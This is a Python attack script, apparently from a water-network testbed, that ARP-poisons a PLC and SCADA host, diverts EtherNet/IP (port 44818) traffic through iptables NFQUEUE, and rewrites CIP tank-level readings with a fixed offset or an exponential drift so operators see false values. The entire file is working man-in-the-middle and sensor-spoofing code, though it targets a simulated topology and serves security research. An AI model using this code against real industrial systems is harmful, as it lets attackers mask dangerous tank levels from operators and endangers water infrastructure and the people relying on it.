import cip
from netfilterqueue import NetfilterQueue
from scapy.layers.inet import IP
from scapy.layers.inet import TCP
from scapy.all import Ether
from scapy.all import *
import sys
import os
import time
import shlex
import numpy as np

from ips import PLC_IPS

import sqlite3

# connection to the database
conn = sqlite3.connect('../../ICS_topologies/enhanced_ctown_topology/ctown_db.sqlite')
c = conn.cursor()
iteration = 0
enip_port = 44818
sniffed_packet = []

# The attack on PLC2 is a replay attack
injection_phase = 0

# The attack on SCADA is an integrity attack on T_LVL
spoof_phase = 0
spoof_counter = 0

spoof_attack_counter = 0

nfqueue = NetfilterQueue()
spoof_offset = 2.5

attack_on = 0


def spoof_value(raw):
    print ("Spoofing-----------")
    float_value = translate_load_to_float(raw)
    fake_value = float_value + spoof_offset
    c.execute("UPDATE ctown SET value = 3 WHERE name = 'ATT_1'")
    conn.commit()
    pay = translate_float_to_load(fake_value, raw[0], raw[1])
    return pay

def exponential_spoof(raw):
    print ("Spoofing-----------")
    k = 20
    t = 10
    float_value = translate_load_to_float(raw)

    fake_value = float_value - k*(1-np.exp(-spoof_attack_counter/t))

    c.execute("UPDATE ctown SET value = 3 WHERE name = 'ATT_1'")
    conn.commit()
    pay = translate_float_to_load(fake_value, raw[0], raw[1])
    return pay

def capture(packet):
    print("Packet...")
    pkt = IP(packet.get_payload())
    if len(pkt) == 102:
        print("Capturing...")
        raw = pkt[Raw].load  # This is a string with the "RAW" part of the packet (CIP payload)
        if sys.argv[3] == "empty_tank_1":
            if sys.argv[1] == '192.168.1.1':
                pay = spoof_value(raw)
                pkt[Raw].load = pay  # Replace the tank level with the spoofed one
                del pkt[TCP].chksum  # Needed to recalculate the checksum
                packet.set_payload(str(pkt))

                rows = c.execute("SELECT value FROM ctown WHERE name = 'ATT_2'").fetchall()
                conn.commit()
                attack_on = int(rows[0][0])

                if attack_on == 0:
                    print("Attack finished")
                    global spoof_phase
                    spoof_phase = 0
                    __setdown(enip_port)
                    return 0

        if sys.argv[3] == "exponential_offset":
            if sys.argv[1] == '192.168.1.1':
                pay = exponential_spoof(raw)
                pkt[Raw].load = pay  # Replace the tank level with the spoofed one
                del pkt[TCP].chksum  # Needed to recalculate the checksum
                packet.set_payload(str(pkt))
                rows = c.execute("SELECT value FROM ctown WHERE name = 'ATT_2'").fetchall()
                conn.commit()
                attack_on = int(rows[0][0])

                if attack_on == 0:
                    print("Attack finished")
                    global spoof_phase
                    spoof_phase = 0
                    __setdown(enip_port)
                    return 0

                global spoof_attack_counter
                spoof_attack_counter += 1

    packet.accept()


def translate_load_to_float(raw_load):
    test = raw_load[5] + raw_load[4] + raw_load[3] + raw_load[2]  # Handle endianness with the payload
    hex_value = test.encode("hex")  # Encode as HEX
    float_value = struct.unpack('!f', hex_value.decode('hex'))[0]  # Convert HEX into float
    return float_value


def translate_float_to_load(fv, header0, header1):
    un = hex(struct.unpack('<I', struct.pack('<f', fv))[0])  # Convert to hex again
    to_proces = un[2:].decode("hex")  # Decode as string
    pay = header0 + header1 + to_proces[-1] + to_proces[-2] + to_proces[-3] + to_proces[0]  # Re arrange for endianness. This is a string
    return pay

def start():
    __setup(enip_port)
    nfqueue.bind(0, capture)
    try:
        print("[*] Starting water level spoofing")
        nfqueue.run()
    except KeyboardInterrupt:
        print("[*] Finished attack process")
        __setdown(enip_port)
    return 0


def __setup(port):

    cmd = 'iptables -t mangle -A PREROUTING -p tcp --sport ' + str(port) + ' -j NFQUEUE'
    os.system(cmd)

    cmd = 'iptables -A FORWARD -p icmp -j DROP'
    os.system(cmd)

    cmd = 'iptables -A INPUT -p icmp -j DROP'
    os.system(cmd)

    cmd = 'iptables -A OUTPUT -p icmp -j DROP'
    os.system(cmd)

    launch_arp_poison()

def __setdown(port):
    cmd = 'sudo iptables -t mangle -D PREROUTING -p tcp --sport ' + str(port) + ' -j NFQUEUE'
    os.system(cmd)

    nfqueue.unbind()
    print("[*] Stopping water level spoofing")
    c.execute("UPDATE ctown SET value = 0 WHERE name = 'ATT_1'")
    conn.commit()

def launch_arp_poison():
    targetip = sys.argv[2]
    sourceip = sys.argv[1]

    print("[*] Launching arp poison sourceip: " + sys.argv[1])
    print("[*] Launching arp poison targetip: " + sys.argv[2])

    arppacket = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=targetip)
    targetmac = srp(arppacket, timeout=2, verbose=False)[0][0][1].hwsrc

    print("[*] Targetmac: " + str(targetmac))

    arppacket = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=sourceip)
    response = srp(arppacket, timeout=2, verbose=False)
    print(str(response))
    sourcemac = response[0][0][1].hwsrc

    spoof_arp_cache(sourceip, sourcemac, targetip)
    spoof_arp_cache(targetip, targetmac, sourceip)
    print("[*] Network poisoned")

def spoof_arp_cache(targetip, targetmac, sourceip):
    spoofed = ARP(op=2, pdst=targetip, psrc=sourceip, hwdst=targetmac)
    send(spoofed, verbose=False)

def prepare_network():
    subprocess.call(['route', 'add', 'default', 'gw', '192.168.1.254'], shell=False)
    args = shlex.split("sysctl -w net.ipv4.ip_forward=1")
    subprocess.call(args, shell=False)


if __name__ == '__main__':
    prepare_network()
    print('[] Preparing attack')
    while True:

        rows = c.execute("SELECT value FROM ctown WHERE name = 'ATT_2'").fetchall()
        conn.commit()
        attack_on = int(rows[0][0])

        if attack_on == 1:
            break
        else:
            time.sleep(1)
    print('[*] Attack prepared')
    sys.exit(start())
